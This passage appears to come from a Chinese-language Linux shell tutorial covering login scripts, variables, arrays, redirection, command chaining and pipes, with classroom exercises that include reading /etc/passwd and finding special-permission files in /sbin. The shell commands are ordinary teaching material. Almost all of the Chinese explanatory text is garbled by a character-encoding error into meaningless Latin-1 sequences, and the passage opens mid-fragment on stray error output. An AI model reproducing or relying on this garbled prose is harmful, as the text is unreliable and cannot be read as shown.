/etc/passwd</span><br></pre></td></tr></table></figure><pre><code>useradd: Permission denied.useradd: cannot lock /etc/passwd; try again later.chsh: user &apos;batman&apos; does not exist</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 3.ç”¨æˆ·çš„ç™»å½•æµç¨‹</span></span><br><span class="line"></span><br><span class="line">![01](pic/01.png)</span><br><span class="line"></span><br><span class="line"><span class="comment">## å¯¹äºæ‰€æœ‰çš„ç”¨æˆ·HISTSIZE 500 ï¼Œå¯¹äºrootç”¨æˆ·HISTSIZE 1000</span></span><br><span class="line">/etc/profile start</span><br><span class="line">/etc/profile end</span><br><span class="line"></span><br><span class="line">~/.bash_profile start</span><br><span class="line">~/.bashrc start</span><br><span class="line">/etc/bashrc start</span><br><span class="line"></span><br><span class="line">/etc/bashrc end</span><br><span class="line">~/.bashrc end</span><br><span class="line">~/.bash_profile end</span><br></pre></td></tr></table></figure><h2 id="shellçš„å˜é‡åŠŸèƒ½"><a href="#shellçš„å˜é‡åŠŸèƒ½" class="headerlink" title="shellçš„å˜é‡åŠŸèƒ½"></a>shellçš„å˜é‡åŠŸèƒ½</h2><h3 id="ä»€ä¹ˆæ˜¯å˜é‡"><a href="#ä»€ä¹ˆæ˜¯å˜é‡" class="headerlink" title="ä»€ä¹ˆæ˜¯å˜é‡"></a>ä»€ä¹ˆæ˜¯å˜é‡</h3><ul><li>è®©ä¸€ä¸ªç‰¹å®šçš„å­—ç¬¦ä»£è¡¨ä¸å›ºå®šçš„å†…å®¹ï¼Œæœ‰ç‚¹åƒy=ax+b,yå°±æ˜¯å˜é‡ï¼Œ</li><li>ç”¨ç®€å•çš„å­—çœ¼æ¥ä»£æ›¿æ¯”è¾ƒå¤æ‚æˆ–è€…å®¹æ˜“å˜åŠ¨çš„æ•°æ®ï¼Œå¥½å¤„å°±æ˜¯æ–¹ä¾¿ï¼</li></ul><p>æ¯”å¦‚ç³»ç»Ÿä¸­çš„MAILå’ŒUSERå˜é‡ï¼Œæ ¹æ®å½“å‰ç™»é™†çš„ç”¨æˆ·è€Œå˜åŒ–</p><ul><li>å¯¹è„šæœ¬çš„ç”¨å¤„â€”â€”ä¾‹å¦‚uleè€ƒè¯•çš„è¯„åˆ†è„šæœ¬ï¼Œæ ¹æ®ä½ ä»¬çš„æœºå™¨å·çš„ä¸åŒï¼Œå»æ£€æµ‹ä¸åŒçš„å­¦ç”Ÿè€ƒè¯•æˆç»©</li></ul><h3 id="å˜é‡çš„è®¾ç½®ã€æŸ¥çœ‹å’Œå–æ¶ˆ-echo-unset"><a href="#å˜é‡çš„è®¾ç½®ã€æŸ¥çœ‹å’Œå–æ¶ˆ-echo-unset" class="headerlink" title="å˜é‡çš„è®¾ç½®ã€æŸ¥çœ‹å’Œå–æ¶ˆ echo unset"></a>å˜é‡çš„è®¾ç½®ã€æŸ¥çœ‹å’Œå–æ¶ˆ echo unset</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">        æŸ¥çœ‹echo $&#123;MAIL&#125;</span><br><span class="line">echo $MAIL</span><br><span class="line">è®¾ç½®å˜é‡å=å˜é‡çš„å†…å®¹</span><br><span class="line">myname=booboo</span><br><span class="line">myname="booboo wei"</span><br><span class="line">æ³¨æ„äº‹é¡¹</span><br><span class="line">å˜é‡å‘½åè§„åˆ™ï¼š</span><br><span class="line">1.ç”±æ•°å­—ï¼Œå­—æ¯ï¼Œä¸‹åˆ’çº¿_ç»„æˆ</span><br><span class="line">2.ä¸èƒ½ä»¥æ•°å­—å¼€å¤´</span><br><span class="line">3.å­—æ¯åŒºåˆ†å¤§å°å†™ï¼Œå¤§å°å†™æ•æ„Ÿ</span><br><span class="line">å˜é‡å†…å®¹è‹¥æœ‰ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·</span><br><span class="line">åŒå¼•å·ä¿ç•™ç‰¹æ®Šå­—ç¬¦åŸæœ‰å±æ€§</span><br><span class="line">å•å¼•å·ç‰¹æ®Šå­—ç¬¦å˜ä¸€èˆ¬å­—ç¬¦ï¼ˆçº¯æ–‡æœ¬ï¼‰</span><br><span class="line">ä¹Ÿå¯ä½¿ç”¨\è·³è„±å­—ç¬¦å°†ç‰¹æ®Šå­—ç¬¦å˜æˆä¸€èˆ¬å­—ç¬¦</span><br><span class="line">`æŒ‡ä»¤`æˆ–$(æŒ‡ä»¤)å¯ä»¥å°†æŒ‡ä»¤çš„ç»“æœå˜æˆå˜é‡å†…å®¹</span><br><span class="line">å–æ¶ˆunset å˜é‡å</span><br><span class="line">unset myname</span><br><span class="line">```                </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### è¯¾å ‚ç»ƒä¹ </span></span></span><br><span class="line">1. è®¾ç½®å˜é‡myname=supermanå¹¶æŸ¥çœ‹å˜é‡çš„å€¼ï¼›</span><br><span class="line">2. è®¾ç½®å˜é‡myname1=I am superman</span><br><span class="line">myname2="I am superman"</span><br><span class="line">myname3='I am superman'å¹¶æŸ¥çœ‹æ‰€æœ‰å˜é‡çš„å€¼ï¼›</span><br><span class="line">3. è®¾ç½®ä¸¤ä¸ªå˜é‡åˆ†åˆ«ä¸ºname1="$myname is myname"å’Œname2='$myname is myname';å¹¶æŸ¥çœ‹å˜é‡çš„å€¼ï¼›</span><br><span class="line">4. è®¾ç½®å˜é‡kernelçš„å€¼ä¸ºå½“å‰ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬å·ï¼›</span><br><span class="line">5. è®¾ç½®å˜é‡numçš„å€¼ä¸º/etc/ç›®å½•ä¸‹æ‰€æœ‰ä»¥.confç»“å°¾çš„æ–‡ä»¶çš„æ€»æ•°ï¼›</span><br><span class="line">6. å–æ¶ˆç»ƒä¹ ä¸­çš„æœ‰æ‰€å˜é‡ã€‚</span><br><span class="line"></span><br><span class="line">![02](pic/02.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## å˜é‡å†…å®¹çš„åˆ é™¤å’Œæ›¿æ¢</span></span></span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">å˜é‡è®¾å®šæ–¹å¼è¯´æ˜</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;å˜é‡<span class="comment">#å…³é”®è¯&#125;è‹¥å˜é‡å†…å®¹ä»å¤´å¼€å§‹çš„æ•°æ®ç¬¦åˆã€å…³é”®è¯ã€,åˆ™å°†ç¬¦åˆçš„æœ€çŸ­æ•°æ®åˆ é™¤</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;å˜é‡<span class="comment">##å…³é”®è¯&#125; è‹¥å˜é‡å†…å®¹ä»å¤´å¼€å§‹çš„æ•°æ®ç¬¦åˆã€å…³é”®è¯ã€,åˆ™å°†ç¬¦åˆçš„æœ€é•¿æ•°æ®åˆ é™¤</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;å˜é‡%å…³é”®è¯&#125; è‹¥å˜é‡å†…å®¹ä»å°¾å‘å‰çš„æ•°æ®ç¬¦åˆã€å…³é”®è¯ã€,åˆ™å°†ç¬¦åˆçš„æœ€çŸ­æ•°æ®åˆ é™¤</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;å˜é‡%%å…³é”®è¯&#125;è‹¥å˜é‡å†…å®¹ä»å°¾å‘å‰çš„æ•°æ®ç¬¦åˆã€å…³é”®è¯ã€,åˆ™å°†ç¬¦åˆçš„æœ€é•¿æ•°æ®åˆ é™¤</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;å˜é‡/æ—§å­—ç¬¦ä¸²/æ–°å­—ç¬¦ä¸²&#125; è‹¥å˜é‡å†…å®¹ç¬¦åˆã€æ—§å­—ç¬¦ä¸²ã€åˆ™ã€ç¬¬ä¸€ä¸ªæ—§å­—ç¬¦ä¸²ä¼šè¢«æ–°å­—ç¬¦ä¸²æ›¿æ¢ã€</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;å˜é‡//æ—§å­—ç¬¦ä¸²/æ–°å­—ç¬¦ä¸²&#125;è‹¥å˜é‡å†…å®¹ç¬¦åˆã€æ—§å­—ç¬¦ä¸²ã€åˆ™ã€å…¨éƒ¨çš„æ—§å­—ç¬¦ä¸²ä¼šè¢«æ–°å­—ç¬¦ä¸²æ›¿æ¢ã€</span></span><br></pre></td></tr></table></figure><h4 id="è¯¾å ‚ç»ƒä¹ "><a href="#è¯¾å ‚ç»ƒä¹ " class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><ol><li>è®¾ç½®å˜é‡path=${PATH} å¹¶æŸ¥çœ‹ï¼›</li><li>è®¾ç½®å˜é‡path=/batman/bin:${path}:/superman/bin å¹¶æŸ¥çœ‹ï¼›</li><li>è¯»å–å˜é‡çš„æ—¶å€™å°†/batman/bin:åŠç¬¬ä¸€ä¸ªå†’å·åŠä¹‹å‰çš„åˆ é™¤ï¼›</li><li>è¯»å–å˜é‡çš„æ—¶å€™å°†æœ€åä¸€ä¸ªå†’å·åŠä¹‹å‰çš„éƒ½åˆ é™¤ï¼›</li><li>è¯»å–å˜é‡çš„æ—¶å€™å°†:/superman/binåŠæœ€åä¸€ä¸ªå†’å·åŠä¹‹åçš„åˆ é™¤ï¼›</li><li>è¯»å–å˜é‡çš„æ—¶å€™å°†ç¬¬ä¸€ä¸ªå†’å·åŠä¹‹åçš„éƒ½åˆ é™¤ï¼›</li><li>è¯»å–å˜é‡çš„æ—¶å€™å°†ç¬¬ä¸€ä¸ªsbinæ›¿æ¢æˆSBINï¼›</li><li>è¯»å–å˜é‡çš„æ—¶å€™å°†æ‰€æœ‰çš„sbinæ›¿æ¢æˆSBINï¼›</li><li>å–æ¶ˆç»ƒä¹ ä¸­çš„pathå˜é‡ã€‚</li></ol><h3 id="å˜é‡çš„åˆ†ç±»ï¼šå±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡-env-set-export"><a href="#å˜é‡çš„åˆ†ç±»ï¼šå±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡-env-set-export" class="headerlink" title="å˜é‡çš„åˆ†ç±»ï¼šå±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡ env set export"></a>å˜é‡çš„åˆ†ç±»ï¼šå±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡ env set export</h3><ul><li>åˆ†ç±»æ ‡å‡†    å˜é‡æ˜¯å¦ä¼šè¢«å­ç¨‹åºæ‰€ç»§ç»­å¼•ç”¨ï¼›å±€éƒ¨å˜é‡ä¸ä¼šï¼›å…¨å±€å˜é‡ä¼š</li><li>env     åˆ—å‡ºç›®å‰shellç¯å¢ƒä¸‹çš„æ‰€æœ‰å…¨å±€å˜é‡</li><li>set     æŸ¥çœ‹æ‰€æœ‰å˜é‡ï¼ŒåŒ…æ‹¬ç¯å¢ƒå˜é‡å’Œå±€éƒ¨å˜é‡</li><li>export    å°†å±€éƒ¨å˜é‡è½¬æˆå…¨å±€å˜é‡    export myname</li></ul><h4 id="è¯¾å ‚ç»ƒä¹ -1"><a href="#è¯¾å ‚ç»ƒä¹ -1" class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><pre><code>1. æ‰“å¼€ä¸€ä¸ªç»ˆç«¯bashï¼ŒæŸ¥çœ‹è¯¥ç»ˆç«¯çš„pidå·ï¼›2. è®¾ç½®æœ¬åœ°å˜é‡justice1=&quot;this is local&quot;å¹¶æŸ¥çœ‹;3. è®¾ç½®ç¯å¢ƒå˜é‡justice2=&quot;this is env&quot;å¹¶æŸ¥çœ‹;4. æ‰“å¼€å­ç»ˆç«¯bashï¼ŒæŸ¥çœ‹è¯¥ç»ˆç«¯çš„pidå·å’Œppidå·ï¼›5. åœ¨å­ç»ˆç«¯ä¸­åˆ†åˆ«æŸ¥çœ‹å˜é‡justice1å’Œjustice2çš„å€¼ï¼›</code></pre><h3 id="å˜é‡è¯»å–ã€æ•°ç»„ä¸å®£å‘Š-read-array-declare"><a href="#å˜é‡è¯»å–ã€æ•°ç»„ä¸å®£å‘Š-read-array-declare" class="headerlink" title="å˜é‡è¯»å–ã€æ•°ç»„ä¸å®£å‘Š read array declare"></a>å˜é‡è¯»å–ã€æ•°ç»„ä¸å®£å‘Š read array declare</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">readä»é”®ç›˜è¯»å–æ•°æ®å­˜å…¥å˜é‡</span><br><span class="line">read -p "plz input yourname:" -t 30 name æŒ‰ä¸‹å›è½¦è¾“å…¥å˜é‡nameçš„å€¼ï¼Œä¼šç­‰å¾…30sç»“æŸ</span><br><span class="line">array</span><br><span class="line">æ•°ç»„çš„è®¾å®šA[0]=1;A[1]=2;A[2]=3</span><br><span class="line">A=(1 2 3)</span><br><span class="line">A=(1 2 3 [50]=4)</span><br><span class="line">A=(1 2 3 [50]=4 5)</span><br><span class="line">æ•°ç»„çš„è¯»å–echo $&#123;A[0]&#125;</span><br><span class="line">echo $&#123;A[@]&#125;</span><br><span class="line">echo $&#123;A[*]&#125;</span><br><span class="line">* ä»£è¡¨çš„æ˜¯ä¸€æ¬¡å–å‡ºæ‰€æœ‰çš„å€¼ ,@ ä»£è¡¨ä¾æ¬¡å–å€¼</span><br><span class="line">for i in "$A[@]";do echo $i;done</span><br><span class="line">for i in "$A[*]";do echo $i;done</span><br><span class="line">declare</span><br><span class="line">declare å‚æ•°</span><br><span class="line">-a å°†å˜é‡çœ‹æˆæ•°ç»„</span><br><span class="line">-i å°†å˜é‡çœ‹æˆæ•´æ•°</span><br><span class="line">-r ä½¿å˜é‡åªè¯»</span><br><span class="line">x=1</span><br><span class="line">y=2</span><br><span class="line">sum=$(($x+$y))</span><br></pre></td></tr></table></figure><h4 id="è¯¾å ‚ç»ƒä¹ -2"><a href="#è¯¾å ‚ç»ƒä¹ -2" class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><pre><code>1. ç”¨readå‘½ä»¤ä»é”®ç›˜è¯»å–numå˜é‡çš„å€¼ï¼Œæç¤ºè¯­å¥ä¸ºâ€œè¯·è¾“å…¥ä½ çš„æœºå™¨å·ï¼šâ€ï¼Œé™æ—¶é—´20sï¼›2. è®¾ç½®æ•°ç»„S ç¬¬ä¸€ä½ä¸º1ï¼Œç¬¬äºŒä½ä¸º2ï¼Œç¬¬ä¸‰åä½ä¸º4ï¼Œç¬¬ä¸‰åä¸€ä½ä¸º5ï¼Œè¯»å–æ•°ç»„æ‰€æœ‰çš„å€¼ï¼Œè¯»å–æ•°ç»„ç¬¬äºŒä½ï¼›3. è®¾ç½®å˜é‡x=1ï¼Œy=2ï¼Œå˜é‡sum=$x+$yï¼ŒæŸ¥çœ‹sumçš„å€¼ï¼›4. å®£å‘Šå˜é‡xä¸ºæ•´æ•°å‹å€¼ä¸º1ï¼Œå˜é‡yä¸ºæ•´æ•°å‹å€¼ä¸º2,å˜é‡sumä¸ºæ•´æ•°å‹=$x+$yï¼ŒæŸ¥çœ‹sumçš„å€¼ï¼›</code></pre><h2 id="æ•°æ®æµé‡å¯¼å‘redirection"><a href="#æ•°æ®æµé‡å¯¼å‘redirection" class="headerlink" title="æ•°æ®æµé‡å¯¼å‘redirection"></a>æ•°æ®æµé‡å¯¼å‘redirection</h2><h3 id="ä½•è°“æ•°æ®æµé‡å¯¼å‘"><a href="#ä½•è°“æ•°æ®æµé‡å¯¼å‘" class="headerlink" title="ä½•è°“æ•°æ®æµé‡å¯¼å‘"></a>ä½•è°“æ•°æ®æµé‡å¯¼å‘</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">æŒ‡ä»¤æ‰§è¡Œåçš„ç»“æœæœ‰ï¼š</span><br><span class="line">          exit    å‘½ä»¤æ‰§è¡Œæ˜¯å¦æ­£ç¡®çš„è¿”å›å€¼?0æ­£ç¡®ï¼›ï¼0é”™è¯¯ç®€ç§°ä»£ç ç¬¦å·</span><br><span class="line">          returnå‘½ä»¤æ‰§è¡Œè¾“å‡ºçš„æ­£ç¡®ä¿¡æ¯standard output    stdout1&gt;æˆ–è€…&gt;&gt;</span><br><span class="line">å‘½ä»¤æ‰§è¡Œè¾“å‡ºçš„é”™è¯¯ä¿¡æ¯standard error outputstderr22&gt;æˆ–è€…2&gt;&gt;</span><br><span class="line">æŒ‡ä»¤æ‰§è¡Œå‰çš„è¾“å…¥ï¼šå‘½ä»¤æ‰§è¡Œè¾“å…¥çš„ä¿¡æ¯standard instdin0&lt;æˆ–è€…&lt;&lt;</span><br><span class="line"></span><br><span class="line">ç”¨æ³•æ€»ç»“</span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> :ä»¥è¦†ç›–çš„æ–¹æ³•å°†ã€æ­£ç¡®çš„æ•°æ®ã€è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼›</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash">&gt;:ä»¥è¿½åŠ çš„æ–¹æ³•å°†ã€æ­£ç¡®çš„æ•°æ®ã€è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼›</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> :ä»¥è¦†ç›–çš„æ–¹æ³•å°†ã€é”™è¯¯çš„æ•°æ®ã€è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼›</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash">&gt;:ä»¥è¿½åŠ çš„æ–¹æ³•å°†ã€é”™è¯¯çš„æ•°æ®ã€è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼›</span></span><br><span class="line"></span><br><span class="line">catä»é”®ç›˜è¯»å–æ•°æ®å­˜å…¥æ–‡ä»¶</span><br><span class="line">cat &gt; /tmp/catfile ä»¥ctrl+dç»“æŸ</span><br><span class="line">cat &gt; /tmp/catfile &lt; /tmp/passwd</span><br><span class="line">cat &gt; /tmp/catfile &lt;&lt; ENDF</span><br><span class="line">standard in</span><br><span class="line">ENDF===&gt;ç»“æŸæç¤ºç¬¦</span><br></pre></td></tr></table></figure><h4 id="è¯¾å ‚ç»ƒä¹ -3"><a href="#è¯¾å ‚ç»ƒä¹ -3" class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><pre><code>1. æŸ¥çœ‹ç³»ç»Ÿ/ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åå’Œå±æ€§ï¼Œå¹¶è®°å½•åˆ°/tmp/fileæ–‡ä»¶ä¸­ï¼›2. æŸ¥çœ‹ç³»ç»Ÿ/var/ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åå’Œå±æ€§ï¼Œå¹¶è¿½åŠ è®°å½•åˆ°/tmp/fileæ–‡ä»¶ä¸­ï¼›3. åˆ‡æ¢åˆ°studentç”¨æˆ·ï¼Œåœ¨/homeç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶åä¸º.bashrcçš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼›4. åˆ‡æ¢åˆ°studentç”¨æˆ·ï¼Œåœ¨/homeç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶åä¸º.bashrcçš„æ–‡ä»¶ï¼Œå°†è¯¥å‘½ä»¤æ‰§è¡Œè¾“å‡ºçš„æ­£ç¡®ä¿¡æ¯æ˜¾ç¤ºåˆ°å±å¹•ä¸Šï¼Œå°†è¯¥å‘½ä»¤æ‰§è¡Œè¾“å‡ºçš„é”™è¯¯ä¿¡æ¯æ”¾åˆ°é»‘æ´/dev/nullä¸­ï¼›5. åˆ‡æ¢åˆ°studentç”¨æˆ·ï¼Œåœ¨/homeç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶åä¸º.bashrcçš„æ–‡ä»¶ï¼Œå°†è¯¥å‘½ä»¤æ‰§è¡Œè¾“å‡ºçš„æ­£ç¡®ä¿¡æ¯ä¿å­˜åˆ°/tmp/stdoutæ–‡ä»¶ä¸­å¹¶æŸ¥çœ‹ï¼Œå°†è¯¥å‘½ä»¤æ‰§è¡Œè¾“å‡ºçš„é”™è¯¯ä¿¡æ¯æ”¾åˆ°é»‘æ´/dev/nullä¸­ï¼›6. åˆ‡æ¢åˆ°studentç”¨æˆ·ï¼Œåœ¨/homeç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶åä¸º.bashrcçš„æ–‡ä»¶ï¼Œå°†è¯¥å‘½ä»¤æ‰§è¡Œè¾“å‡ºçš„æ­£ç¡®ä¿¡æ¯ä¿å­˜åˆ°/tmp/stdoutæ–‡ä»¶ä¸­ï¼Œå°†è¯¥å‘½ä»¤æ‰§è¡Œè¾“å‡ºçš„é”™è¯¯ä¿¡æ¯ä¿å­˜åˆ°/tmp/stderræ–‡ä»¶ä¸­ï¼Œå¹¶æŸ¥çœ‹ï¼›7. åˆ‡æ¢åˆ°studentç”¨æˆ·ï¼Œåœ¨/homeç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶åä¸º.bashrcçš„æ–‡ä»¶ï¼Œå°†è¯¥å‘½ä»¤æ‰§è¡Œè¾“å‡ºçš„æ‰€æœ‰ä¿¡æ¯ï¼ˆæ­£ç¡®å’Œé”™è¯¯ï¼‰éƒ½ä¿å­˜åˆ°/tmp/allä¸­ï¼Œå¹¶æŸ¥çœ‹ï¼›8. ä½¿ç”¨catå‘½ä»¤ä»é”®ç›˜è¯»å–æ•°æ®hellowordå¹¶è¦†ç›–/tmp/catfileæ–‡ä»¶ï¼›9. ä½¿ç”¨catå‘½ä»¤å°†/etc/passwd/çš„å†…å®¹è¦†ç›–/tmp/catfileæ–‡ä»¶ï¼›10. ä½¿ç”¨catå‘½ä»¤ä»é”®ç›˜è¯»å–æ•°æ®hellowordå¹¶è¦†ç›–/tmp/catfileæ–‡ä»¶ï¼Œä»¥ç»“æŸæç¤ºç¬¦çš„æ–¹å¼ç»“æŸï¼›</code></pre><h3 id="å‘½ä»¤æ‰§è¡Œçš„åˆ¤æ–­ä¾æ®-amp-amp"><a href="#å‘½ä»¤æ‰§è¡Œçš„åˆ¤æ–­ä¾æ®-amp-amp" class="headerlink" title="å‘½ä»¤æ‰§è¡Œçš„åˆ¤æ–­ä¾æ® ; &amp;&amp; ||"></a>å‘½ä»¤æ‰§è¡Œçš„åˆ¤æ–­ä¾æ® ; &amp;&amp; ||</h3><ul><li>CMD1 &amp;&amp; CMD2     å¦‚æœå‰ä¸€ä¸ªå‘½ä»¤ (CMD1) èƒ½å¤Ÿæ­£ç¡®è¢«æ‰§è¡Œ , åˆ™æ‰§è¡Œåä¸€ä¸ªå‘½ä»¤ (CMD2)</li><li>CMD1 || CMD2     å¦‚æœå‰ä¸€ä¸ªå‘½ä»¤ (CMD1) è¢«æ­£ç¡®æ‰§è¡Œ , åˆ™ä¸æ‰§è¡Œåä¸€ä¸ªå‘½ä»¤ (CMD2), å¦‚æœå‰ä¸€ä¸ªå‘½ä»¤(CMD1) æ‰§è¡Œé”™è¯¯ , åˆ™æ‰§è¡Œåä¸€ä¸ªå‘½ä»¤ (CMD2).</li><li>CMD1 ; CMD2    å‘½ä»¤ä¹‹é—´æ²¡æœ‰å…³ç³»ï¼Œä»ç¬¬ä¸€ä¸ªå¼€å§‹æ‰§è¡Œï¼Œä¸ç®¡æ˜¯å¦æ­£ç¡®æ‰§è¡Œéƒ½ä¼šå»æ‰§è¡Œç¬¬äºŒä¸ªå‘½ä»¤</li></ul><h4 id="è¯¾å ‚å®éªŒ"><a href="#è¯¾å ‚å®éªŒ" class="headerlink" title="è¯¾å ‚å®éªŒ"></a>è¯¾å ‚å®éªŒ</h4><pre><code>1. åˆ›å»ºç›®å½•/tmp/cmd,å¦‚æœåˆ›å»ºæˆåŠŸé‚£ä¹ˆå°±å†åˆ›å»ºä¸€ä¸ªç›®å½•/tmp/cmd/cdm1;2. åˆ›å»ºç›®å½•/tmp/cmd,å¦‚æœåˆ›å»ºå¤±è´¥ï¼Œé‚£ä¹ˆå°±å†èˆ¹èˆ°ä¸€ä¸ªç›®å½•/tmp/cmd/cmd2;3. ä¸ç®¡ç›®å½•/tmp/cmdæ˜¯å¦åˆ›å»ºæˆåŠŸï¼Œéƒ½ä¼šå»å†åˆ›å»ºä¸€ä¸ªç›®å½•/tmp/tmpcmd;</code></pre><h3 id="ç®¡é“å‘½ä»¤pipe"><a href="#ç®¡é“å‘½ä»¤pipe" class="headerlink" title="ç®¡é“å‘½ä»¤pipe"></a>ç®¡é“å‘½ä»¤pipe</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">   #</span><span class="bash">æˆªå– grep cut</span></span><br><span class="line">grep bash$ /etc/passwd</span><br><span class="line">cut -d : -f 3 /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">æ’åº sort uniq</span></span><br><span class="line">sort -t: -k3 -n /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">ç»Ÿè®¡ wc</span></span><br><span class="line">wc -l /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">æ›¿æ¢ xargs</span></span><br><span class="line">find /sbin/ -perm +7000|wc -l</span><br><span class="line">find /sbin/ -perm +7000|xargs wc -l</span><br><span class="line"></span><br><span class="line">è¯¾å ‚ç»ƒä¹ ï¼š</span><br><span class="line">1.æ‰¾å‡º/sbin/ç›®å½•ä¸‹æœ‰ç‰¹æ®Šæƒé™çš„æ–‡ä»¶ï¼Œå¹¶ç»Ÿè®¡æ¯ä¸ªæ–‡ä»¶çš„è¡Œæ•°</span><br><span class="line">2.æ‰¾å‡º/sbin/ç›®å½•ä¸‹æœ‰ç‰¹æ®Šæƒé™çš„æ–‡ä»¶ï¼Œå¹¶ç»Ÿè®¡æœ‰å‡ ä¸ª</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">å‡å· -</span></span><br><span class="line">è¯¾å ‚ç»ƒä¹ ï¼š</span><br><span class="line">1.å°†/homeç›®å½•æ‰“åŒ…å‹ç¼©åè§£å‹åˆ°/tmpç›®å½•</span><br></pre></td></tr></table></figure><h3 id="shellä¸‹çš„ç‰¹æ®Šç¬¦å·"><a href="#shellä¸‹çš„ç‰¹æ®Šç¬¦å·" class="headerlink" title="shellä¸‹çš„ç‰¹æ®Šç¬¦å·"></a>shellä¸‹çš„ç‰¹æ®Šç¬¦å·</h3><pre><code>#    æ³¨é‡Šç¬¦\    è·³è„±ç¬¦|    ç®¡é“;    è¿ç»­æŒ‡ä»¤çš„ä¸‹è¾¾~    å®¶ç›®å½•$    å–ç”¨å˜é‡ç¬¦&amp;    è¿›ç¨‹æ§åˆ¶åå°è¿è¡Œ!    é€»è¾‘è¿ç®—é/    æ ¹ç›®å½•&gt;,&gt;&gt;    æ•°æ®æµé‡å¯¼å‘ è¾“å‡º&lt;,&lt;&lt;    